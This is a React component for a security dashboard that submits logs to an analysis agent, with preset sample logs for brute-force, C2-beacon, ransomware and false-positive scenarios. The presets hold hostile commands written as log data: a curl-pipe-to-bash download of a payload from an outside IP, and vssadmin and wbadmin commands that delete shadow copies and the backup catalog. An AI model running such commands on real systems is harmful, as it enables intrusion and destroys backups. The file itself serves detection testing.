import React, { useState } from 'react';
import { submitLog } from '../hooks/useApi';

const PRESETS = {
  'brute-force': `2024-11-15T08:22:31Z [SSHD] Failed password for root from 185.220.101.47 port 54321 ssh2
2024-11-15T08:22:33Z [SSHD] Failed password for admin from 185.220.101.47 port 54322 ssh2
2024-11-15T08:22:41Z [SSHD] Accepted password for backup_svc from 185.220.101.47 port 54326 ssh2
2024-11-15T08:22:45Z [BASH]  backup_svc executed: curl http://194.165.16.11/payload.sh | bash
2024-11-15T08:22:47Z [NET]   Outbound connection to 194.165.16.11:4444 from 10.0.1.55`,

  'c2-beacon': `2024-11-15T14:01:00Z [PROXY] GET http://185.220.101.47/beacon?id=c2fa3901&interval=300 200 OK
2024-11-15T14:11:24Z [EDR]   File write: C:\\Windows\\Temp\\dllhost.exe hash=44d88612fea8a8f36de82e1278abb02f
2024-11-15T14:11:25Z [EDR]   Scheduled task created: MicrosoftUpdateHelper
HOST: WORKSTATION-047 USER: jsmith`,

  'ransomware': `2024-11-15T22:55:00Z [CRITICAL] Mass file rename: *.docx → *.docx.LOCKED — Rate: 847 files/min
2024-11-15T22:55:02Z [EDR]   vssadmin.exe delete shadows /all on WORKSTATION-112
2024-11-15T22:55:03Z [EDR]   wbadmin.exe delete catalog -quiet
2024-11-15T22:55:05Z [NET]   Outbound to 103.21.244.0:443 from WORKSTATION-112
SOURCE_IP: 185.220.101.47 HASH: abc123def456abc123def456abc123de`,

  'false-positive': `2024-11-15T09:00:01Z [SSHD] Accepted publickey for deploy from 10.0.1.100 port 41234 ssh2
2024-11-15T09:00:05Z [BASH]  deploy executed: ./deploy.sh --env=production
2024-11-15T09:05:30Z [APP]   Deployment completed successfully`,
};

export default function SubmitLog({ onSubmitted }) {
  const [log, setLog] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async () => {
    if (!log.trim()) { setError('Please enter a log.'); return; }
    setSubmitting(true);
    setError('');
    try {
      const result = await submitLog(log, 'dashboard');
      onSubmitted(result.incident_id);
    } catch (e) {
      setError(e.response?.data?.detail || e.message || 'Submission failed. Is the API running?');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div style={{ maxWidth: 900 }}>
      <h2 style={{ fontFamily: 'var(--font-mono)', fontSize: 18, color: 'var(--cyan)', letterSpacing: '0.1em', marginBottom: 24, textShadow: 'var(--glow-cyan)' }}>
        SUBMIT LOG FOR ANALYSIS
      </h2>

      {/* Preset buttons */}
      <div className="panel" style={{ padding: 20, marginBottom: 20 }}>
        <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-secondary)', letterSpacing: '0.08em', marginBottom: 12 }}>
          LOAD PRESET SCENARIO
        </div>
        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
          {Object.keys(PRESETS).map(key => (
            <button key={key} className="btn btn-primary" onClick={() => setLog(PRESETS[key])} style={{ fontSize: 12, padding: '6px 14px' }}>
              {key.replace('-', ' ').toUpperCase()}
            </button>
          ))}
        </div>
      </div>

      {/* Log textarea */}
      <div className="panel" style={{ padding: 20, marginBottom: 20 }}>
        <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-secondary)', letterSpacing: '0.08em', marginBottom: 12 }}>
          RAW LOG INPUT
        </div>
        <textarea
          value={log}
          onChange={e => setLog(e.target.value)}
          placeholder="Paste your security log here..."
          style={{
            width: '100%', height: 280,
            background: 'var(--bg-deep)',
            border: '1px solid var(--border)',
            borderRadius: 4,
            color: 'var(--text-primary)',
            fontFamily: 'var(--font-mono)',
            fontSize: 12, lineHeight: 1.7,
            padding: 16, resize: 'vertical',
            outline: 'none',
          }}
          onFocus={e => e.target.style.borderColor = 'var(--cyan-dim)'}
          onBlur={e => e.target.style.borderColor = 'var(--border)'}
        />
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: 12 }}>
          <span style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-dim)' }}>
            {log.length} characters · {log.split('\n').filter(Boolean).length} lines
          </span>
          <button onClick={() => setLog('')} style={{ background: 'none', border: 'none', color: 'var(--text-dim)', cursor: 'pointer', fontFamily: 'var(--font-mono)', fontSize: 11 }}>
            CLEAR
          </button>
        </div>
      </div>

      {error && (
        <div style={{ padding: '12px 16px', background: 'rgba(255,51,85,0.1)', border: '1px solid rgba(255,51,85,0.3)', borderRadius: 4, color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 12, marginBottom: 16 }}>
          ✕ {error}
        </div>
      )}

      <button className="btn btn-approve" onClick={handleSubmit} disabled={submitting || !log.trim()} style={{ fontSize: 14, padding: '12px 32px' }}>
        {submitting ? '⟳ SUBMITTING...' : '⊕ SUBMIT FOR ANALYSIS'}
      </button>

      <p style={{ marginTop: 12, color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', fontSize: 11 }}>
        After submission, you'll be taken to the live incident view where you can watch the agent analyze, investigate, and respond in real time.
      </p>
    </div>
  );
}